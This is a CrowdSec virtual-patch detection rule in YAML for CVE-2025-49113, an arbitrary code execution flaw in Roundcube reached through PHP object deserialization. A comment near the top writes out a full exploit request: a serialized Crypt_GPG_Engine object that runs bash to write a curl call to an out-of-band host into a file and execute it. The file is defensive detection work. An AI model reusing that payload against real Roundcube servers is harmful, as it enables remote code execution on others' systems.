name: crowdsecurity/vpatch-CVE-2025-49113
description: 'Detects arbitrary remote code execution vulnerability via PHP Object Deserialization in Roundcube'
#POST /?_task=settings&_framed=1&_remote=1&_from=!";O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:{{44 + len(oast_new)}}:"bash+-c+"printf+'curl+{{oast_new}}'>/tmp/p;bash+/tmp/p";";}}&_action=upload 
rules:
  - and:
      - zones:
          - METHOD
        match:
          type: equals
          value: POST
      - zones:
          - ARGS
        variables:
          - _task
        transform:
          - urldecode
          - lowercase
        match:
          type: equals
          value: 'settings'
      - zones:
          - ARGS
        variables:
          - _action
        transform:
          - urldecode
          - lowercase
        match:
          type: equals
          value: 'upload'
      - zones:
          - ARGS
        variables:
          - _from
        transform:
          - urldecode
          - lowercase
        match:
          type: regex
          value: "[^\\w.-]"

labels:
  type: exploit
  service: http
  confidence: 3
  spoofable: 0
  behavior: 'http:exploit'
  label: 'Roundcube - RCE via PHP Object Deserialization'
  classification:
    - cve.CVE-2025-49113
    - attack.T1190
    - cwe.CWE-502